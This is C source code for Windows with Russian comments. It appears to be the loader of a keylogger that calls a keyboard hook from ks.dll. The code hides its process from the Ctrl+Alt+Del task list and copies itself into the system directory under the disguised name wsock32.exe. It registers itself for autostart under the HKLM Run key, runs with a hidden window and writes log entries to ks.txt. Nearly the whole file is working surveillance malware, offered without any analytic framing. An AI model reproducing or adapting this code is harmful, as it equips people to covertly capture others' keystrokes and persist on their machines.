#include "ks.h"
char szClassName[256] = "hKs10";
char szAppName[256] = "hKsv10";
typedef DWORD (WINAPI *PREGISTERSERVICEPROCESS)(DWORD,DWORD);
//проца для прятания от Ctrl+Alt+Del
bool RSP(double p1, double p2)
{
PREGISTERSERVICEPROCESS rsp;
HINSTANCE hK32;
bool Rc=false;
hK32=GetModuleHandle("kernel32.dll");
if(hK32!=NULL) {
rsp=(PREGISTERSERVICEPROCESS) GetProcAddress(hK32, "RegisterServiceProcess");
if(rsp!=NULL) {
Rc=true;
rsp(p1,p2);
}
FreeLibrary(hK32);
}
return Rc;
}

LRESULT CALLBACK WndProc(HWND,UINT,WPARAM,LPARAM);
int APIENTRY WinMain(HINSTANCE hInstance,
HINSTANCE hPrevInstance,
LPSTR lpCmdLine,
int nCmdShow)
{
//прячем от 3x клавиш
if(FindWindow(NULL,szAppName)) PostQuitMessage(1);
RSP(NULL,1);
//копируем ex-шник и дополнительную dll в %winsysdir%
    char szValue [256] = "wsock32.exe";
    HKEY pKey;
//прописываемся в автостарте
    RegCreateKey(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",&pKey);
    RegSetValueEx(pKey,"wsock32",NULL,REG_SZ,(BYTE *)szValue,strlen(szValue)+1);
char WinDir[256] = "";
    GetSystemDirectory(WinDir,sizeof(WinDir));
    strcat(WinDir,"\\");
    strcat(WinDir,szValue);
    LPSTR lpFile = new TCHAR[256];
    GetModuleFileName(NULL,lpFile,200);
   
    CopyFile(lpFile,WinDir,FALSE);
GetSystemDirectory(WinDir,sizeof(WinDir));
strcat(WinDir,"\\ks.dll");
CopyFile("ks.dll",WinDir,FALSE);
//пишем дату записи в файл
    char BufStr1[6666] = "";
char DateStr0[256] = "dd.MM.yyyy";
    char TimeStr1[256] = "hh : mm : ss";
    char DateStr1[256] = "";
GetDateFormat(NULL,NULL,NULL,DateStr0,DateStr1,sizeof(DateStr1));
strcpy(BufStr1,"\n---------------------------------------------------\n");
strcat(BufStr1," Write to file: [");
strcat(BufStr1,DateStr1);
strcat(BufStr1,"] ");
    GetTimeFormat(NULL,TIME_FORCE24HOURFORMAT,NULL,TimeStr1,DateStr1,sizeof(DateStr1));
strcat(BufStr1," ");
strcat(BufStr1,DateStr1);
strcat(BufStr1,"\n");

    char LogFile[256]= "";
    GetSystemDirectory(LogFile,256);
    strcat(LogFile,"\\ks.txt");
    HFILE Log1 = _lopen(LogFile,OF_WRITE);
    _lwrite(Log1,BufStr1,lstrlen(BufStr1));
    _lclose(Log1);

    HksInit();

HWND hwnd;
    MSG msg;
    WNDCLASS wc;
    wc.style = 0;
    wc.lpfnWndProc = WndProc;
    wc.cbClsExtra = 0;
    wc.cbWndExtra = 0;
    wc.lpszClassName = szClassName;
    wc.lpszMenuName = NULL;
    wc.hInstance = hInstance;
    wc.hCursor = LoadCursor(NULL,IDC_ARROW);
    wc.hIcon = LoadIcon(NULL,IDI_APPLICATION);
    wc.hbrBackground = (HBRUSH) COLOR_WINDOW;

    RegisterClass(&wc);

    hwnd = CreateWindow(szClassName,
        szAppName,
                        WS_OVERLAPPEDWINDOW,
                        2,
                        10,
                        70,
                        100,
                        NULL,
                        NULL,
                        hInstance,
                        NULL);

    ShowWindow(hwnd,SW_HIDE);
    UpdateWindow(hwnd);
//обрабатываем сообщения
while (GetMessage(&msg,NULL,0,0)) {
TranslateMessage(&msg);
DispatchMessage(&msg);
    }
    return 0;
}
LRESULT CALLBACK WndProc(HWND hwnd, UINT iMsg, WPARAM wParam, LPARAM lParam)
{
    switch (iMsg)
    {
    case WM_CREATE:return 1;break;
        case WM_DESTROY:
            HksClose();
            PostQuitMessage(1);
            break;
    };


    return DefWindowProc(hwnd,iMsg,wParam,lParam);
}